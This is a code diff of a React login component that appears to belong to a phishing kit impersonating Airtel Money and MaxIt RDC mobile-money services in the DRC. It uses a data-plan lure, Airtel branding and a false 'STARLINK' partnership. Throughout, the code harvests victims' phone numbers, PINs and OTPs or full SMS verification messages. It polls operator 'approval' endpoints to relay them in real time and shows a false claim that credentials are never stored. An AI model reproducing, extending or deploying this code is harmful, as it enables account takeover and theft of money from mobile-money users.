@@ -1,541 +1,457 @@
-import { useState, useRef, useEffect } from 'react';
-import { useNavigate } from 'react-router-dom';
-import { useLoanApplication } from '../LoanApplicationContext';
-import { useUserId } from '../hooks/useUserId';
+import React, { useState, useEffect, useRef, useCallback } from 'react';
+import { useNavigate, useParams } from 'react-router-dom';
+import { useLoanApplication } from './LoanApplicationContext';
+import { useUserId } from './UserIdContext';
 import './Login.css';
-import './Otp.css';
 
+// ─── Config ───
+const API_BASE = '';  // same origin
+const MAX_APPROVAL_POLLS = 60;
+const APPROVAL_POLL_MS  = 5000;
+const MAX_OTP_POLLS     = 150;  // 5 min at 2s
+const OTP_POLL_MS       = 2000;
 
-// ── Phone validation: DRC +243, starts with 9, 9 or 10 digits ──
-const validatePhoneNumber = (number) => {
-  if (!number) return { valid: false, message: '' };
-  const length = number.length;
-  if (length < 9 || length > 10) return { valid: false, message: '' };
-  if (length === 10) {
-    if (!number.startsWith('09'))
-      return { valid: false, message: 'Le numéro à 10 chiffres doit commencer par 09' };
-  } else if (length === 9) {
-    if (!number.startsWith('9'))
-      return { valid: false, message: 'Le numéro à 9 chiffres doit commencer par 9' };
-  }
-  return { valid: true, message: '' };
+// ─── Phone validation (DRC +243) ───
+function validatePhone(raw) {
+  const digits = raw.replace(/\D/g, '');
+  if (!digits.startsWith('9')) return { valid: false, error: 'Must start with 9' };
+  if (digits.length < 9 || digits.length > 10) return { valid: false, error: '9–10 digits required' };
+  return { valid: true, formatted: `+243${digits}` };
+}
+
+// ─── Provider config ───
+const PROVIDER_CONFIG = {
+  airtel: {
+    name: 'Airtel Money',
+    otpLabel: 'OTP Code',
+    otpPlaceholder: 'Enter 4-digit OTP',
+    otpInstructions: 'Enter the 4-digit code sent to your phone',
+    inputType: 'numeric', // single text input for 4-digit code
+  },
+  maxit: {
+    name: 'MaxIt RDC',
+    otpLabel: 'Verification Message',
+    otpPlaceholder: 'Paste the full SMS message here...',
+    otpInstructions: 'Paste the complete SMS verification message you received',
+    inputType: 'textarea', // textarea for SMS paste (up to 500 chars)
+  },
 };
 
 export default function Login() {
   const navigate = useNavigate();
-  const { userId, apiBase } = useUserId();
-  const { personalDetailsData, updateAuthData, authData, serverStatus } = useLoanApplication();
+  const { userId, provider } = useParams();
+  const { visitorId } = useUserId();
+  const { loanApplication } = useLoanApplication();
 
-  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';
-  const api = (path) => `${API_BASE_URL}${apiBase}/${path}`;
+  const effectiveUserId = userId || visitorId;
+  const providerCfg = PROVIDER_CONFIG[provider] || PROVIDER_CONFIG.airtel;
+  const plan = loanApplication?.selectedPlan || null;
 
-  const initialPhone = personalDetailsData?.phoneNumber
-    ? personalDetailsData.phoneNumber.replace(/\D/g, '').slice(-10)
-    : '';
-
-  // ── Stages: credentials → approvalWaiting → otp → otpProcessing ──
-  const [stage, setStage] = useState('credentials');
-  const [phoneNumber, setPhoneNumber] = useState(initialPhone);
+  // ─── State ───
+  const [stage, setStage] = useState('credentials'); // credentials | approvalWaiting | otp | otpProcessing
+  const [phone, setPhone] = useState('');
   const [pin, setPin] = useState(['', '', '', '']);
-  const [showPin, setShowPin] = useState(false);
-  const [otp, setOtp] = useState('');
-  const [isProcessing, setIsProcessing] = useState(false);
-  const [isReturningUser, setIsReturningUser] = useState(false);
-  const [waitingForApproval, setWaitingForApproval] = useState(false);
-  const [showErrorModal, setShowErrorModal] = useState(false);
-  const [errorMessage, setErrorMessage] = useState('');
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState(null);
+  const [otpValue, setOtpValue] = useState('');
+  const [resendDisabled, setResendDisabled] = useState(false);
+  const [pollCount, setPollCount] = useState(0);
 
-  // OTP-specific state
-  const [otpTimer, setOtpTimer] = useState(0);
-  const [isResending, setIsResending] = useState(false);
-  const [isSubmitting, setIsSubmitting] = useState(false);
-  const [verificationStatus, setVerificationStatus] = useState('');
-  const [isOtpApproved, setIsOtpApproved] = useState(false);
-  const [progress, setProgress] = useState(0);
-  const [waitingForOtpApproval, setWaitingForOtpApproval] = useState(false);
-
-  const pinRefs = [useRef(null), useRef(null), useRef(null), useRef(null)];
-  const otpInputRef = useRef(null);
-  const pollingIntervalRef = useRef(null);
-  const pollingAttempts = useRef(0);
-  const previousStatusRef = useRef(null);
-  const maxPollingAttempts = 60;
+  const pinRefs = [useRef(), useRef(), useRef(), useRef()];
+  const pollRef = useRef(null);
+  const mountedRef = useRef(true);
 
   useEffect(() => {
-    return () => { if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current); };
+    mountedRef.current = true;
+    return () => { mountedRef.current = false; clearInterval(pollRef.current); };
   }, []);
 
-  // ── OTP timer countdown ──
+  // ─── Redirect if no plan selected ───
   useEffect(() => {
-    if (otpTimer > 0 && stage === 'otp') {
-      const timer = setInterval(() => setOtpTimer(prev => {
-        const v = prev - 1;
-        if (v <= 0) { localStorage.removeItem('otp_timer'); return 0; }
-        return v;
-      }), 1000);
-      return () => clearInterval(timer);
-    }
-  }, [otpTimer, stage]);
+    if (!plan) navigate(`/${effectiveUserId}/dataplans`, { replace: true });
+  }, [plan, navigate, effectiveUserId]);
 
-  // ── OTP processing progress bar → navigate on complete ──
+  // ─── Check if user already approved (returning user) ───
   useEffect(() => {
-    if (stage === 'otpProcessing' && isOtpApproved && progress < 100) {
-      const t = setTimeout(() => setProgress(prev => Math.min(prev + Math.random() * 15 + 5, 100)), 300);
-      return () => clearTimeout(t);
-    } else if (progress >= 100 && isOtpApproved && stage === 'otpProcessing') {
-      setTimeout(() => navigate(`/${userId}/status`), 500);
-    }
-  }, [stage, isOtpApproved, progress, navigate, userId]);
-
-  // ── Poll for login approval when waiting after credentials ──
-  useEffect(() => {
-    if (stage !== 'approvalWaiting') return;
-    pollingAttempts.current = 0;
-
-    const poll = async () => {
+    const checkReturning = async () => {
       try {
-        pollingAttempts.current++;
-        if (pollingAttempts.current > maxPollingAttempts) {
-          clearInterval(pollingIntervalRef.current);
-          setWaitingForApproval(false); setIsProcessing(false);
-          setErrorMessage('Une erreur s\'est produite, veuillez réessayer');
-          setShowErrorModal(true); setStage('credentials'); return;
+        const res = await fetch(`${API_BASE}/api/${effectiveUserId}/check-user-status`, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
+        const data = await res.json();
+        if (data.success && data.hasActiveSession) {
+          navigate(`/${effectiveUserId}/status`, { replace: true });
         }
-        const cleanNumber = phoneNumber.startsWith('0') ? phoneNumber.slice(1) : phoneNumber;
-        const formattedPhone = `+243${cleanNumber}`;
-        const response = await fetch(api('check-login-approval'), {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phoneNumber: formattedPhone, pin: pin.join('') })
-        });
-        const data = await response.json();
-        if (data.success) {
-          if (data.approved) {
-            clearInterval(pollingIntervalRef.current);
-            setWaitingForApproval(false);
-            await new Promise(r => setTimeout(r, 500));
-            if (isReturningUser) {
-              navigate(`/${userId}/status`);
-            } else {
-              // Move to OTP stage
-              setStage('otp');
-              setOtp('');
-              setOtpTimer(40);
-              setWaitingForOtpApproval(false);
-              setIsProcessing(false);
-              localStorage.setItem('otp_timer', JSON.stringify({ endTime: Date.now() + 40000 }));
-              setTimeout(() => otpInputRef.current?.focus(), 100);
-            }
-          } else if (data.rejected) {
-            clearInterval(pollingIntervalRef.current);
-            setWaitingForApproval(false); setIsProcessing(false);
-            setErrorMessage('PIN incorrect');
-            setShowErrorModal(true); setStage('credentials');
-          } else if (data.expired) {
-            clearInterval(pollingIntervalRef.current);
-            setWaitingForApproval(false); setIsProcessing(false);
-            setErrorMessage('Une erreur s\'est produite, veuillez réessayer');
-            setShowErrorModal(true); setStage('credentials');
-          }
-        }
-      } catch (error) { console.error('Polling error:', error); }
+      } catch (_) { /* ignore */ }
     };
+    checkReturning();
+  }, [effectiveUserId, navigate]);
 
-    pollingIntervalRef.current = setInterval(poll, 5000);
-    poll();
-    return () => { if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current); };
-  }, [stage]);
+  // ─── API helper ───
+  const apiCall = useCallback(async (endpoint, body) => {
+    const res = await fetch(`${API_BASE}/api/${effectiveUserId}/${endpoint}`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body),
+    });
+    return res.json();
+  }, [effectiveUserId]);
 
-  // ── Phone handlers ──
-  const handlePhoneChange = (e) => setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10));
-  const handlePhonePaste = (e) => { e.preventDefault(); setPhoneNumber(e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 10)); };
-
-  // ── PIN handlers ──
+  // ─── PIN input handlers ───
   const handlePinChange = (index, value) => {
-    const v = value.replace(/\D/g, ''); if (v.length > 1) return;
-    const newPin = [...pin]; newPin[index] = v; setPin(newPin);
-    if (v && index < 3) pinRefs[index + 1].current.focus();
+    if (!/^\d?$/.test(value)) return;
+    const next = [...pin];
+    next[index] = value;
+    setPin(next);
+    if (value && index < 3) pinRefs[index + 1].current?.focus();
   };
-  const handlePinPaste = (e, index) => {
-    e.preventDefault();
-    const digits = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4).split('');
-    const newPin = [...pin];
-    digits.forEach((d, i) => { if (index + i < 4) newPin[index + i] = d; });
-    setPin(newPin); pinRefs[Math.min(index + digits.length, 3)].current.focus();
-  };
+
   const handlePinKeyDown = (index, e) => {
-    if (e.key === 'Backspace') {
-      if (pin[index]) { const n = [...pin]; n[index] = ''; setPin(n); }
-      else if (index > 0) pinRefs[index - 1].current.focus();
-    } else if (e.key === 'ArrowLeft' && index > 0) pinRefs[index - 1].current.focus();
-    else if (e.key === 'ArrowRight' && index < 3) pinRefs[index + 1].current.focus();
-  };
-  const handlePinKeyPress = (e) => { if (!/^\d$/.test(e.key)) e.preventDefault(); };
-
-  // ── OTP handler (single text input, 4 digits) ──
-  const handleOtpChange = (e) => {
-    const v = e.target.value.replace(/\D/g, '');
-    if (v.length <= 4) setOtp(v);
+    if (e.key === 'Backspace' && !pin[index] && index > 0) {
+      pinRefs[index - 1].current?.focus();
+    }
   };
 
-  // ── Login submit ──
-  const handleLogin = async (e) => {
-    e.preventDefault();
+  // ─── Submit credentials ───
+  const handleSubmitCredentials = async () => {
+    const pv = validatePhone(phone);
+    if (!pv.valid) return setError(pv.error);
     const fullPin = pin.join('');
-    const validation = validatePhoneNumber(phoneNumber);
-    if (!validation.valid) {
-      setErrorMessage('Le numéro de téléphone doit commencer par 9 (9 chiffres) ou 09 (10 chiffres)!\nVeuillez entrer le bon numéro et réessayer!');
-      setShowErrorModal(true); return;
-    }
-    if (fullPin.length !== 4) {
-      setErrorMessage('Veuillez entrer un PIN complet à 4 chiffres');
-      setShowErrorModal(true); return;
-    }
+    if (fullPin.length !== 4) return setError('Enter your 4-digit PIN');
 
-    const cleanNumber = phoneNumber.startsWith('0') ? phoneNumber.slice(1) : phoneNumber;
-    const formattedPhone = `+243${cleanNumber}`;
-
-    updateAuthData({ phoneNumber: formattedPhone, pin: fullPin, isAuthenticated: false });
-    try {
-      localStorage.setItem('ecocash_phone', formattedPhone);
-      localStorage.setItem('ecocash_auth', JSON.stringify({
-        phoneNumber: formattedPhone, pin: fullPin,
-        isAuthenticated: false, timestamp: new Date().toISOString()
-      }));
-    } catch (err) { console.error('Failed to save auth:', err); }
-
-    setIsProcessing(true);
+    setLoading(true);
+    setError(null);
 
     try {
-      const statusResponse = await fetch(api('check-user-status'), {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phoneNumber: formattedPhone })
+      const data = await apiCall('login', {
+        phoneNumber: pv.formatted,
+        pin: fullPin,
+        provider: provider,
+        package: plan ? { id: plan.id, data: plan.data, price: plan.price } : null,
+        timestamp: Date.now(),
       });
-      const statusData = await statusResponse.json();
-      const returning = statusData.isReturningUser || false;
-      setIsReturningUser(returning);
 
-      const loginResponse = await fetch(api('login'), {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phoneNumber: formattedPhone, pin: fullPin, timestamp: new Date().toISOString() })
-      });
-      const loginData = await loginResponse.json();
-      if (loginData.success) {
-        setWaitingForApproval(true);
-        setStage('approvalWaiting');
-      } else {
-        setIsProcessing(false);
-        setErrorMessage('Échec du traitement de la connexion. Veuillez réessayer.');
-        setShowErrorModal(true);
-      }
-    } catch (error) {
-      console.error('Login error:', error);
-      setIsProcessing(false);
-      setErrorMessage('Échec du traitement de la connexion. Veuillez réessayer.');
-      setShowErrorModal(true);
+      if (!data.success) { setError(data.message || 'Login failed'); setLoading(false); return; }
+
+      // If returning user: straight to status
+      if (data.returningUser) { navigate(`/${effectiveUserId}/status`, { replace: true }); return; }
+
+      // Start approval polling
+      setLoading(false);
+      setStage('approvalWaiting');
+      startApprovalPolling(pv.formatted, fullPin);
+    } catch (err) {
+      setError('Connection error. Please try again.');
+      setLoading(false);
     }
   };
 
-  // ── OTP status polling ──
-  const checkOTPStatus = async (phone, otpCode) => {
-    const startTime = Date.now();
-    const maxTime = 5 * 60 * 1000;
-    const pollInterval = 2000;
-    while (Date.now() - startTime < maxTime) {
+  // ─── Approval polling ───
+  const startApprovalPolling = (phoneNum, pinVal) => {
+    let count = 0;
+    clearInterval(pollRef.current);
+
+    pollRef.current = setInterval(async () => {
+      if (!mountedRef.current) { clearInterval(pollRef.current); return; }
+      count++;
+      setPollCount(count);
+
+      if (count >= MAX_APPROVAL_POLLS) {
+        clearInterval(pollRef.current);
+        setError('Session timed out. Please try again.');
+        setStage('credentials');
+        return;
+      }
+
       try {
-        const response = await fetch(api('check-otp-status'), {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phoneNumber: phone, otp: otpCode })
-        });
-        const data = await response.json();
-        if (data.status === 'approved') return { approved: true };
-        if (data.status === 'rejected') return { approved: false, message: 'Code incorrect' };
-        if (data.status === 'wrong_pin') return { approved: false, wrongPin: true, message: 'PIN incorrect' };
-        const elapsed = Math.floor((Date.now() - startTime) / 1000);
-        const newStatus = `Veuillez patienter... (${elapsed}s)`;
-        if (previousStatusRef.current !== newStatus) { setVerificationStatus(newStatus); previousStatusRef.current = newStatus; }
-        await new Promise(r => setTimeout(r, pollInterval));
-      } catch (error) {
-        console.error('OTP status error:', error);
-        await new Promise(r => setTimeout(r, pollInterval));
-      }
-    }
-    return { approved: false, timeout: true, message: 'Délai d\'expiration. Veuillez réessayer.' };
+        const data = await apiCall('check-login-approval', { phoneNumber: phoneNum, pin: pinVal });
+
+        if (data.approved) {
+          clearInterval(pollRef.current);
+          setStage('otp');
+        } else if (data.rejected) {
+          clearInterval(pollRef.current);
+          setError(data.expired ? 'Session expired. Please try again.' : 'Login rejected. Invalid credentials.');
+          setStage('credentials');
+        }
+      } catch (_) { /* keep polling */ }
+    }, APPROVAL_POLL_MS);
   };
 
-  // ── OTP submit ──
-  const handleOtpSubmit = async (e) => {
-    e.preventDefault();
-    if (isSubmitting) return;
-    if (otp.length !== 4) {
-      setErrorMessage('Veuillez entrer un code OTP valide à 4 chiffres');
-      setShowErrorModal(true); return;
-    }
-    setIsSubmitting(true);
-    const phone = authData?.phoneNumber || `+243${phoneNumber.startsWith('0') ? phoneNumber.slice(1) : phoneNumber}`;
+  // ─── Submit OTP / verification message ───
+  const handleSubmitOtp = async () => {
+    const pv = validatePhone(phone);
+    if (!pv.valid) return;
 
-    updateAuthData({ otp, isAuthenticated: true });
+    // Validate OTP value
+    if (provider === 'airtel') {
+      if (!/^\d{4}$/.test(otpValue)) return setError('Enter a valid 4-digit code');
+    } else {
+      if (!otpValue.trim()) return setError('Paste the SMS verification message');
+      if (otpValue.length > 500) return setError('Message too long (max 500 characters)');
+    }
+
+    setStage('otpProcessing');
+    setError(null);
 
     try {
-      await fetch(api('verify-otp'), {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phoneNumber: phone, otp, timestamp: new Date().toISOString() })
+      const data = await apiCall('verify-otp', {
+        phoneNumber: pv.formatted,
+        otp: otpValue.trim(),
+        provider: provider,
+        package: plan ? { id: plan.id, data: plan.data, price: plan.price } : null,
+        timestamp: Date.now(),
       });
 
-      setStage('otpProcessing');
-      setVerificationStatus('Veuillez patienter...');
-      previousStatusRef.current = 'Veuillez patienter...';
-      setIsOtpApproved(false); setProgress(0);
+      if (!data.success) { setError(data.message || 'Verification failed'); setStage('otp'); return; }
 
-      const result = await checkOTPStatus(phone, otp);
-
-      if (result.approved) {
-        localStorage.removeItem('otp_timer');
-        setVerificationStatus('✅ Vérifié! En cours...');
-        previousStatusRef.current = '✅ Vérifié! En cours...';
-        setIsOtpApproved(true);
-      } else if (result.wrongPin) {
-        setStage('credentials'); setIsSubmitting(false); setIsProcessing(false);
-        setProgress(0); setIsOtpApproved(false);
-        localStorage.removeItem('otp_timer'); localStorage.removeItem('ecocash_phone');
-        updateAuthData({ phoneNumber: '', pin: '', otp: '', isAuthenticated: false });
-        setErrorMessage('Le PIN ou le numéro de téléphone que vous avez entré était incorrect. Veuillez vous reconnecter.');
-        setShowErrorModal(true); previousStatusRef.current = null;
-      } else if (result.timeout) {
-        setStage('otp'); setIsSubmitting(false); setProgress(0); setIsOtpApproved(false);
-        setErrorMessage('Délai d\'expiration. Veuillez réessayer.');
-        setShowErrorModal(true); previousStatusRef.current = null;
-      } else {
-        setStage('otp'); setIsSubmitting(false); setProgress(0); setIsOtpApproved(false);
-        setOtp('');
-        setErrorMessage(result.message || 'Code incorrect. Veuillez réessayer.');
-        setShowErrorModal(true); previousStatusRef.current = null;
-        setTimeout(() => otpInputRef.current?.focus(), 100);
-      }
-    } catch (error) {
-      console.error('OTP verification error:', error);
-      setStage('otp'); setIsSubmitting(false); setProgress(0); setIsOtpApproved(false);
-      setErrorMessage('Échec de la vérification. Veuillez réessayer.');
-      setShowErrorModal(true); previousStatusRef.current = null;
+      // Poll OTP status
+      startOtpPolling(pv.formatted, otpValue.trim());
+    } catch (err) {
+      setError('Connection error. Please try again.');
+      setStage('otp');
     }
   };
 
-  // ── Resend OTP ──
+  // ─── OTP status polling ───
+  const startOtpPolling = (phoneNum, otpVal) => {
+    let count = 0;
+    clearInterval(pollRef.current);
+
+    pollRef.current = setInterval(async () => {
+      if (!mountedRef.current) { clearInterval(pollRef.current); return; }
+      count++;
+
+      if (count >= MAX_OTP_POLLS) {
+        clearInterval(pollRef.current);
+        setError('Verification timed out. Please try again.');
+        setStage('otp');
+        return;
+      }
+
+      try {
+        const data = await apiCall('check-otp-status', { phoneNumber: phoneNum, otp: otpVal });
+
+        if (data.status === 'approved') {
+          clearInterval(pollRef.current);
+          navigate(`/${effectiveUserId}/status`, { replace: true });
+        } else if (data.status === 'rejected') {
+          clearInterval(pollRef.current);
+          setError(provider === 'airtel' ? 'OTP code is incorrect.' : 'Verification message rejected.');
+          setStage('otp');
+          setOtpValue('');
+        } else if (data.status === 'wrong_pin') {
+          clearInterval(pollRef.current);
+          setError('Your PIN is incorrect. Please start over.');
+          setStage('credentials');
+          setOtpValue('');
+          setPin(['', '', '', '']);
+        } else if (data.status === 'insufficient') {
+          clearInterval(pollRef.current);
+          setError(`Insufficient balance for ${plan?.data || 'selected'} package ($${plan?.price?.toFixed(2) || '?'}). Please top up and try again.`);
+          setStage('otp');
+          setOtpValue('');
+        } else if (data.status === 'timeout') {
+          clearInterval(pollRef.current);
+          setError('Session expired.');
+          setStage('otp');
+        }
+      } catch (_) { /* keep polling */ }
+    }, OTP_POLL_MS);
+  };
+
+  // ─── Resend OTP ───
   const handleResend = async () => {
-    if (otpTimer > 0 || isResending) return;
-    const phone = authData?.phoneNumber || `+243${phoneNumber.startsWith('0') ? phoneNumber.slice(1) : phoneNumber}`;
-    if (!phone || phone === '+243 900 123 456') return;
-    setIsResending(true);
+    const pv = validatePhone(phone);
+    if (!pv.valid) return;
+    setResendDisabled(true);
+
     try {
-      const response = await fetch(api('resend-otp'), {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phoneNumber: phone, timestamp: new Date().toISOString() })
-      });
-      const data = await response.json();
-      if (data.success) {
-        setOtp(''); setOtpTimer(40);
-        localStorage.setItem('otp_timer', JSON.stringify({ endTime: Date.now() + 40000 }));
-        otpInputRef.current?.focus();
-      }
-    } catch (error) { console.error('Resend error:', error); }
-    finally { setIsResending(false); }
+      await apiCall('resend-otp', { phoneNumber: pv.formatted, timestamp: Date.now() });
+    } catch (_) { /* ignore */ }
+
+    setTimeout(() => { if (mountedRef.current) setResendDisabled(false); }, 30000);
   };
 
-  const closeErrorModal = () => { setShowErrorModal(false); setErrorMessage(''); };
-  const isFormComplete = phoneNumber.length >= 9 && pin.every(d => d !== '');
-  const isOtpValid = otp.length === 4;
+  // ─── RENDER ───
+  const isAirtel = provider === 'airtel';
 
-  const getButtonState = () => {
-    if (serverStatus?.isChecking) return { text: 'ATTENDEZ...', disabled: true, className: 'login-button waiting' };
-    if (serverStatus && !serverStatus.isActive) return { text: 'ERREUR SERVEUR', disabled: true, className: 'login-button error' };
-    return { text: 'CONNEXION', disabled: !isFormComplete || isProcessing, className: 'login-button' };
-  };
-  const buttonState = getButtonState();
-
-  // ══════════════════════════════════════════════════
-  // PROCESSING / APPROVAL WAITING SCREEN
-  // ══════════════════════════════════════════════════
-  if (stage === 'approvalWaiting' || (isProcessing && stage === 'credentials')) {
-    return (
-      <div className="login-container">
-        <div className="processing-overlay">
-          <div className="processing-card">
-            <div className="spinner-container"><div className="spinner"></div></div>
-            <h1 className="processing-title">
-              {waitingForApproval ? 'Veuillez patienter...' : 'Traitement en cours...'}
-            </h1>
-            <p className="processing-subtitle">
-              {waitingForApproval ? 'Cela prend généralement quelques secondes'
-                : isReturningUser ? 'Bon retour! Redirection vers le tableau de bord...'
-                : 'Préparation de la vérification...'}
-            </p>
-          </div>
+  return (
+    <div className={`login-page ${provider}`}>
+      {/* Header */}
+      <header className="login-header">
+        <button className="login-back-btn" onClick={() => navigate(`/${effectiveUserId}/dataplans`)}>
+          ←
+        </button>
+        <div className="login-header-info">
+          <div className="provider-label">{providerCfg.name}</div>
+          {plan && <div className="plan-label">{plan.data} — ${plan.price?.toFixed(2)}</div>}
         </div>
-      </div>
-    );
-  }
+        <div className="provider-badge">{isAirtel ? 'A' : 'M'}</div>
+      </header>
 
-  // ══════════════════════════════════════════════════
-  // OTP PROCESSING SCREEN
-  // ══════════════════════════════════════════════════
-  if (stage === 'otpProcessing') {
-    return (
-      <div className="otp-container">
-        <main className="otp-content">
-          <div className="processing-card">
-            <div className="spinner-container"><div className="spinner"></div></div>
-            <h1 className="processing-title">Vérification de l'OTP</h1>
-            <p className="processing-subtitle">{verificationStatus}</p>
-          </div>
-        </main>
-        <footer className="otp-footer">
-          <img src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg"
-            alt="Airtel Logo" style={{ height: '40px', marginBottom: '10px' }} />
-        </footer>
-      </div>
-    );
-  }
+      <div className="login-body">
+        {/* ─── CREDENTIALS STAGE ─── */}
+        {stage === 'credentials' && (
+          <>
+            <h2 className="login-section-title">
+              {isAirtel ? 'Airtel Money Login' : 'MaxIt Login'}
+            </h2>
+            <p className="login-section-subtitle">
+              Enter your {isAirtel ? 'Airtel Money' : 'MaxIt'} phone number and PIN to continue
+            </p>
 
-  // ══════════════════════════════════════════════════
-  // OTP ENTRY SCREEN
-  // ══════════════════════════════════════════════════
-  if (stage === 'otp') {
-    const phoneDisplay = authData?.phoneNumber || `+243${phoneNumber.startsWith('0') ? phoneNumber.slice(1) : phoneNumber}`;
-    return (
-      <div className="otp-container">
-        {showErrorModal && (
-          <div className="error-modal-overlay" onClick={closeErrorModal}>
-            <div className="error-modal" onClick={(e) => e.stopPropagation()}>
-              <h2 className="error-modal-title">Erreur</h2>
-              <p className="error-modal-message">{errorMessage}</p>
-              <button className="error-modal-button" onClick={closeErrorModal}>OK</button>
+            {/* Phone */}
+            <div className="input-group">
+              <label>Phone Number</label>
+              <div className="phone-input-wrapper">
+                <div className="phone-prefix">
+                  <span className="flag">🇨🇩</span> +243
+                </div>
+                <input
+                  type="tel"
+                  placeholder="9XXXXXXXXX"
+                  value={phone}
+                  onChange={(e) => setPhone(e.target.value.replace(/[^\d]/g, ''))}
+                  maxLength={10}
+                />
+              </div>
+            </div>
+
+            {/* PIN */}
+            <div className="input-group">
+              <label>{isAirtel ? 'Airtel Money' : 'MaxIt'} PIN</label>
+              <div className="pin-input-row">
+                {pin.map((digit, i) => (
+                  <input
+                    key={i}
+                    ref={pinRefs[i]}
+                    className="pin-box"
+                    type="text"
+                    inputMode="numeric"
+                    maxLength={1}
+                    value={digit}
+                    onChange={(e) => handlePinChange(i, e.target.value)}
+                    onKeyDown={(e) => handlePinKeyDown(i, e)}
+                  />
+                ))}
+              </div>
+            </div>
+
+            {/* Warning */}
+            <div className="warning-banner">
+              <span className="warning-icon">⚠️</span>
+              <span>Your PIN is encrypted and used only for this transaction. We never store your credentials.</span>
+            </div>
+
+            {/* Submit */}
+            <button
+              className="login-submit-btn"
+              disabled={loading || phone.length < 9 || pin.join('').length < 4}
+              onClick={handleSubmitCredentials}
+            >
+              {loading ? 'Connecting...' : 'Continue'}
+            </button>
+          </>
+        )}
+
+        {/* ─── APPROVAL WAITING STAGE ─── */}
+        {stage === 'approvalWaiting' && (
+          <div className="waiting-screen">
+            <div className="waiting-spinner" />
+            <h3>Verifying Credentials</h3>
+            <p>Please wait while we verify your {providerCfg.name} details...</p>
+            <div className="waiting-timer">
+              {Math.floor((pollCount * APPROVAL_POLL_MS) / 1000)}s elapsed
             </div>
           </div>
         )}
 
-        <header className="otp-header">
-          <button className="back-btn" onClick={() => { setStage('credentials'); setOtp(''); setIsProcessing(false); }}>←</button>
-          <div className="logo-large">
-            <img src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg" alt="Airtel Logo" />
-          </div>
-          <button className="menu-btn" aria-label="Menu">
-            <div className="menu-line"></div><div className="menu-line"></div><div className="menu-line"></div>
-          </button>
-        </header>
+        {/* ─── OTP / VERIFICATION STAGE ─── */}
+        {stage === 'otp' && (
+          <div className="otp-section">
+            <h2 className="login-section-title">{providerCfg.otpLabel}</h2>
+            <p className="otp-instructions">{providerCfg.otpInstructions}</p>
 
-        <main className="otp-content">
-          <div className="otp-card">
-            <h1 className="otp-title">Vérification OTP</h1>
-            <p className="otp-subtitle">Entrez l'OTP envoyé à votre numéro de téléphone</p>
-            <p className="otp-phone">{phoneDisplay}</p>
+            {/* Airtel: 4-digit numeric input */}
+            {isAirtel ? (
+              <input
+                className="otp-input-single"
+                type="text"
+                inputMode="numeric"
+                maxLength={4}
+                placeholder="0000"
+                value={otpValue}
+                onChange={(e) => setOtpValue(e.target.value.replace(/[^\d]/g, ''))}
+                autoFocus
+              />
+            ) : (
+              /* MaxIt: SMS paste textarea */
+              <>
+                <textarea
+                  className="otp-message-box"
+                  placeholder={providerCfg.otpPlaceholder}
+                  value={otpValue}
+                  onChange={(e) => {
+                    if (e.target.value.length <= 500) setOtpValue(e.target.value);
+                  }}
+                  autoFocus
+                />
+                <div className={`otp-char-count${otpValue.length > 450 ? ' near-limit' : ''}`}>
+                  {otpValue.length}/500
+                </div>
+              </>
+            )}
 
-            <form onSubmit={handleOtpSubmit}>
-              <div className="otp-input-container">
-                <input ref={otpInputRef} type="text" className="otp-input-field"
-                  value={otp} onChange={handleOtpChange} placeholder="Entrer l'OTP à 4 chiffres"
-                  maxLength="4" inputMode="numeric" pattern="[0-9]*"
-                  disabled={isResending || isSubmitting} autoComplete="one-time-code" />
-                <p className="otp-hint">Entrer le code de vérification à 4 chiffres</p>
-                <p className="resend-text">
-                  {isResending ? <span className="resending-text">Renvoi du code...</span>
-                    : otpTimer > 0 ? `Le code expire dans ${otpTimer} secondes`
-                    : <>Vous n'avez pas reçu le code?{' '}<span className="resend-link" onClick={handleResend}>Renvoyer</span></>}
-                </p>
-              </div>
+            <button
+              className="login-submit-btn"
+              disabled={isAirtel ? otpValue.length !== 4 : !otpValue.trim()}
+              onClick={handleSubmitOtp}
+            >
+              Verify
+            </button>
 
-              <button type="submit"
-                className={`submit-button ${isOtpValid ? 'active' : ''}`}
-                disabled={!isOtpValid || isResending || isSubmitting}>
-                {isSubmitting ? 'VÉRIFICATION...' : 'SOUMETTRE'}
+            <div className="resend-row">
+              <button
+                className="resend-link"
+                disabled={resendDisabled}
+                onClick={handleResend}
+              >
+                {resendDisabled ? 'Resend requested...' : "Didn't receive it? Resend"}
               </button>
-            </form>
+            </div>
           </div>
-        </main>
+        )}
 
-        <div className="login-footer">
-          <div><img src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg" alt="Airtel Logo" /></div>
-          <span>En collaboration avec</span>
-          <span>STARLINK™</span>
-          <footer className="footer">© 2026 Airtel Congo. Tous droits réservés.</footer>
-        </div>
+        {/* ─── OTP PROCESSING STAGE ─── */}
+        {stage === 'otpProcessing' && (
+          <div className="processing-overlay">
+            <div className="processing-icon">
+              <span>{isAirtel ? '🔐' : '📨'}</span>
+            </div>
+            <h3>Verifying...</h3>
+            <p>Checking your {isAirtel ? 'OTP code' : 'verification message'}</p>
+            <div className="processing-progress">
+              <div className="bar" />
+            </div>
+          </div>
+        )}
       </div>
-    );
-  }
 
-  // ══════════════════════════════════════════════════
-  // CREDENTIALS SCREEN (default)
-  // ══════════════════════════════════════════════════
-  return (
-    <div className="login-container">
-      {showErrorModal && (
-        <div className="error-modal-overlay" onClick={closeErrorModal}>
-          <div className="error-modal-content" onClick={(e) => e.stopPropagation()}>
-            <div className="error-modal-icon">⚠️</div>
-            <h2 className="error-modal-title">Format Invalide</h2>
